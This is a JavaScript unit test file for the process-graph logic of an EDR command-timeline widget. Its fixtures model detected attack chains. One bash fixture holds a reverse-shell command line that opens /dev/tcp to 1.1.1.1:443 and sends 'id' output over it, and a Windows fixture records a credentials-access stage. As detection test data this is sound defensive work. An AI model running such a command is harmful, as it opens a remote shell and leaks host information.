"use strict";
// Pure-logic tests for the node-graph model (widget/widgetAssets/js/timelineGraph.js).
// No DOM, no cytoscape -- just stacks -> graph -> element JSON.
// The two fixture chains are the live-proven shapes:
//   - the bash chain (9 nodes, one line, systemd -> reverse shell);
//   - the Windows control.exe chain (multi-stage merge, self-edge, dangling aux).
// Run with: make test-unit WIDGET=fortiedrCommandTimeline
const g = require("../widget/widgetAssets/js/timelineGraph.js");

// One stage as the console's rdi-events answer carries it.
function rawStage(over) {
  return Object.assign({
    stageName: "PARENT PROCESS CREATION",
    shortSourceProcessName: "sudo",
    sourceProcessPath: "/usr/bin/sudo",
    sourceProcessOwner: null,
    destinationProcessPath: "",
    is64Bit: true,
    certificateStatus: "Unsigned",
    processId: "5302",
    auxProcessId: "5304",
    timestamp: 1793725330000,
    commandLine: "bash /tmp/edr_lab.sh all",
    stackNum: 3,
    stackEntries: [],
  }, over || {});
}

// The live bash chain, in the console's own (unordered) stage order.
function bashChain() {
  return [
    rawStage({ processId: "5302", auxProcessId: "5304", shortSourceProcessName: "sudo",
               commandLine: "bash /tmp/edr_lab.sh all", timestamp: 1793725332000 }),
    rawStage({ processId: "5301", auxProcessId: "5302", shortSourceProcessName: "bash",
               commandLine: "-c sudo bash /tmp/edr_lab.sh all 2>&1 | tail", timestamp: 1793725331000 }),
    rawStage({ processId: "5345", auxProcessId: "5346", shortSourceProcessName: "timeout",
               commandLine: "6 bash -c exec 3<>/dev/tcp/1.1.1.1/443", timestamp: 1793725334000 }),
    rawStage({ processId: "5304", auxProcessId: "5345", shortSourceProcessName: "bash",
               commandLine: "/tmp/edr_lab.sh all", timestamp: 1793725333000 }),
    rawStage({ processId: "5225", auxProcessId: "5300", shortSourceProcessName: "sshd",
               commandLine: "-D -R", timestamp: 1793725329000 }),
    rawStage({ processId: "1", auxProcessId: "1064", shortSourceProcessName: "systemd",
               commandLine: "", timestamp: 1793725327000 }),
    rawStage({ processId: "1064", auxProcessId: "5225", shortSourceProcessName: "sshd",
               commandLine: "", timestamp: 1793725328000 }),
    rawStage({ processId: "5300", auxProcessId: "5301", shortSourceProcessName: "sshd",
               commandLine: "-D -R", timestamp: 1793725330000 }),
    rawStage({ stageName: "CONNECTION STACK", processId: "5346", auxProcessId: null,
               shortSourceProcessName: "bash",
               commandLine: '-c exec 3<>/dev/tcp/1.1.1.1/443 && { echo "id=$(id)', timestamp: 1793725335000 }),
  ];
}

// The live Windows chain: 8 clean spawn stages, then control.exe (pid 4392)
// appears in three more stages -- a self thread-creation, an open-process on
// a pid the chain never kept (4), and a credentials access on another (684).
// Sensor-relative stamps (~4.1e9) that are NOT plausible epochs.
function controlChain() {
  return [
    rawStage({ processId: "3328", auxProcessId: "6824", shortSourceProcessName: "userinit.exe", timestamp: 4054092603 }),
    rawStage({ processId: "6824", auxProcessId: "8156", shortSourceProcessName: "explorer.exe", timestamp: 4054092611 }),
    rawStage({ processId: "8156", auxProcessId: "6000", shortSourceProcessName: "OneDrive.exe",
               commandLine: "/background", timestamp: 4054092619 }),
    rawStage({ processId: "6000", auxProcessId: "6172", shortSourceProcessName: "OneDriveSetup.exe",
               commandLine: "/update /restart /updateSource:ODU", timestamp: 4054092800 }),
    rawStage({ processId: "6172", auxProcessId: "1252", shortSourceProcessName: "OneDriveSetup.exe",
               commandLine: "/update /restart /updateSource:ODU  /per", timestamp: 4054092900 }),
    rawStage({ processId: "1252", auxProcessId: "5544", shortSourceProcessName: "OneDrive.exe",
               commandLine: "/updateInstalled /background", timestamp: 4054093000 }),
    rawStage({ processId: "5544", auxProcessId: "492", shortSourceProcessName: "explorer.exe", timestamp: 4054093100 }),
    rawStage({ processId: "492", auxProcessId: "4392", shortSourceProcessName: "Windows_Update.exe", timestamp: 4054093200 }),
    rawStage({ stageName: "THREAD CREATION STACK", processId: "4392", auxProcessId: "4392",
               shortSourceProcessName: "control.exe", timestamp: 4054093300 }),
    rawStage({ stageName: "OPEN PROCESS STACK", processId: "4392", auxProcessId: "4",
               shortSourceProcessName: "control.exe", timestamp: 4054093400 }),
    rawStage({ stageName: "CREDENTIALS ACCESS", processId: "4392", auxProcessId: "684",
               shortSourceProcessName: "control.exe", timestamp: 4054093500 }),
  ];
}

function nodeFor(graph, id) {
  return graph.nodes.find((n) => n.id === id);
}

// toGraph takes the TIMELINE object (what extractTimeline returns), not the
// bare stacks array -- the same contract buildStages has.
const bashGraph = () => g.toGraph({ stacks: bashChain() });
const controlGraph = () => g.toGraph({ stacks: controlChain() });

describe("toGraph -- the live bash chain", () => {
  const graph = bashGraph();

  test("one node per unique processId: 9 stages -> 9 nodes", () => {
    expect(graph.nodes.length).toBe(9);
    expect(graph.nodes.map((n) => n.pid)).toEqual(
      ["1", "1064", "5225", "5300", "5301", "5302", "5304", "5345", "5346"]);
  });

  test("the spawn chain is a single line systemd -> reverse shell", () => {
    expect(graph.edges).toEqual([
      { source: "1", target: "1064" },
      { source: "1064", target: "5225" },
      { source: "5225", target: "5300" },
      { source: "5300", target: "5301" },
      { source: "5301", target: "5302" },
      { source: "5302", target: "5304" },
      { source: "5304", target: "5345" },
      { source: "5345", target: "5346" },
    ]);
  });

  test("systemd (pid 1) is the only root, first in root order", () => {
    expect(graph.roots).toEqual(["1"]);
  });

  test("labels are two lines: process name + PID (chains repeat names)", () => {
    const sshds = graph.nodes.filter((n) => n.label.indexOf("sshd") === 0);
    expect(sshds.length).toBe(3);
    expect(sshds.map((n) => n.label)).toEqual(
      ["sshd\nPID 1064", "sshd\nPID 5225", "sshd\nPID 5300"]);
  });

  test("the reverse-shell node keeps its command and its activity stage", () => {
    const shell = nodeFor(graph, "5346");
    expect(shell.activity).toBe(true);
    expect(shell.kinds).toEqual(["CONNECTION STACK"]);
    expect(shell.stages.length).toBe(1);
    expect(shell.stages[0].command).toContain("/dev/tcp/1.1.1.1/443");
  });

  test("nodes carry their earliest renderable time", () => {
    expect(nodeFor(graph, "1").time).not.toBe("");
    expect(nodeFor(graph, "5346").time).not.toBe("");
  });
});

describe("toGraph -- the live control.exe chain", () => {
  const graph = controlGraph();

  test("multi-stage processes merge onto ONE node keeping all stages", () => {
    const control = nodeFor(graph, "4392");
    expect(control).toBeDefined();
    expect(control.label).toBe("control.exe\nPID 4392");
    expect(control.stages.length).toBe(3);
    // Chronological stage order inside the merged node.
    expect(control.stages.map((s) => s.stage)).toEqual(
      ["THREAD CREATION STACK", "OPEN PROCESS STACK", "CREDENTIALS ACCESS"]);
    expect(control.kinds).toEqual(
      ["THREAD CREATION STACK", "OPEN PROCESS STACK", "CREDENTIALS ACCESS"]);
  });

  test("self-edges are dropped; the chain's own spawn edge survives", () => {
    const selfEdge = graph.edges.find((e) => e.source === "4392" && e.target === "4392");
    expect(selfEdge).toBeUndefined();
    // The 8 spawn edges, exactly -- including 492 -> 4392 (Windows_Update.exe
    // spawned control.exe), and NO out-edges from control.exe (its aux pids
    // were its own thread, pid 4, and pid 684 -- none of them chain stages).
    expect(graph.edges).toEqual([
      { source: "3328", target: "6824" },
      { source: "6824", target: "8156" },
      { source: "8156", target: "6000" },
      { source: "6000", target: "6172" },
      { source: "6172", target: "1252" },
      { source: "1252", target: "5544" },
      { source: "5544", target: "492" },
      { source: "492", target: "4392" },
    ]);
  });

  test("dangling aux targets produce no edge", () => {
    const to4 = graph.edges.find((e) => e.target === "4");
    const to684 = graph.edges.find((e) => e.target === "684");
    expect(to4).toBeUndefined();
    expect(to684).toBeUndefined();
    expect(graph.nodes.find((n) => n.pid === "4")).toBeUndefined();
  });

  test("the merged activity node is flagged activity, ancestry stages are not", () => {
    expect(nodeFor(graph, "4392").activity).toBe(true);
    expect(nodeFor(graph, "3328").activity).toBe(false);
    expect(nodeFor(graph, "492").activity).toBe(false);
  });

  test("userinit.exe is the single root", () => {
    expect(graph.roots).toEqual(["3328"]);
  });
});

describe("toGraph -- structural rules", () => {
  test("duplicate edges dedupe (two stages of one parent spawning the same child)", () => {
    // The child must exist as its own stage, or its edge is dangling by rule.
    const stacks = [
      rawStage({ processId: "100", auxProcessId: "200", stageName: "PARENT PROCESS CREATION" }),
      rawStage({ processId: "100", auxProcessId: "200", stageName: "PROCESS CREATION" }),
      rawStage({ processId: "200", auxProcessId: null, stageName: "PROCESS ACTIVITY",
                 shortSourceProcessName: "child" }),
    ];
    const graph = g.toGraph({ stacks });
    expect(graph.edges).toEqual([{ source: "100", target: "200" }]);
    expect(graph.nodes.length).toBe(2);
  });

  test("a pid-less stage stands alone on its own node", () => {
    const stacks = [
      rawStage({ processId: null, auxProcessId: null, shortSourceProcessName: "orphan.exe" }),
    ];
    const graph = g.toGraph({ stacks });
    expect(graph.nodes.length).toBe(1);
    expect(graph.nodes[0].id).toBe("stage-0");
    expect(graph.nodes[0].label).toBe("orphan.exe");
    expect(graph.edges).toEqual([]);
    expect(graph.roots).toEqual(["stage-0"]);
  });

  test("an empty stacks list yields an empty graph", () => {
    const graph = g.toGraph({ stacks: [] });
    expect(graph.nodes).toEqual([]);
    expect(graph.edges).toEqual([]);
    expect(graph.roots).toEqual([]);
  });

  test("isActivity: only ancestry stage names are neutral; unknown names are activity", () => {
    expect(g.isActivity("PARENT PROCESS CREATION")).toBe(false);
    expect(g.isActivity("PROCESS CREATION")).toBe(false);
    expect(g.isActivity("process creation ")).toBe(false);  // case/space tolerant
    expect(g.isActivity("THREAD CREATION STACK")).toBe(true);
    expect(g.isActivity("CREDENTIALS ACCESS")).toBe(true);
    expect(g.isActivity("SOMETHING NEVER SEEN")).toBe(true);
    expect(g.isActivity(undefined)).toBe(true);
  });
});

describe("toElements", () => {
  test("node data carries id/label/pid/time/activity/kind/stage counts", () => {
    const graph = controlGraph();
    const els = g.toElements(graph);
    const control = els.nodes.find((n) => n.data.id === "4392");
    expect(control.data).toMatchObject({
      id: "4392", label: "control.exe\nPID 4392", pid: "4392",
      time: "", activity: true, kindCount: 3, stageCount: 3,
    });
  });

  test("edges get synthetic ids parent -> child", () => {
    const graph = bashGraph();
    const els = g.toElements(graph);
    expect(els.edges.length).toBe(8);
    expect(els.edges[0]).toEqual({ data: { id: "e0", source: "1", target: "1064" } });
  });
});

describe("graphStyle / graphLayout", () => {
  test("style has node, activity, selected and edge rules", () => {
    const style = g.graphStyle();
    const selectors = style.map((s) => s.selector);
    expect(selectors).toEqual(expect.arrayContaining(["node", "node[activity]", "node.selected", "edge"]));
    const activity = style.find((s) => s.selector === "node[activity]");
    expect(activity.style["background-color"]).toBe(g.COLORS.ACTIVITY_FILL);
  });

  test("layout is dagre left-to-right", () => {
    expect(g.graphLayout(g.toGraph({ stacks: bashChain() }))).toMatchObject({
      name: "dagre", rankDir: "LR",
    });
  });
});
